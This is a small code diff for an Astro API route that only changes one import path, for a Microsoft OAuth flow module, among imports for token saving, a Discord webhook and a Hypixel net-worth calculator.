@@ -1,7 +1,7 @@
 import type { APIRoute } from "astro";
 import { queryFirstRes } from "../../../../../libs/db/actions/query";
 import saveToken from "../../../../../libs/db/actions/saveToken";
-import oauthFlow from "../../../../../libs/db/microsoft/oauthFlow";
+import oauthFlow from "../../../../../libs/microsoft/oauthFlow";
 import oauthWebhook from "../../../../../libs/discord/oauthWebhook";
 import networthCalc from "../../../../../libs/hypixel/networthCalc";
 import urlHandler from "../../../../../libs/urlHandler";
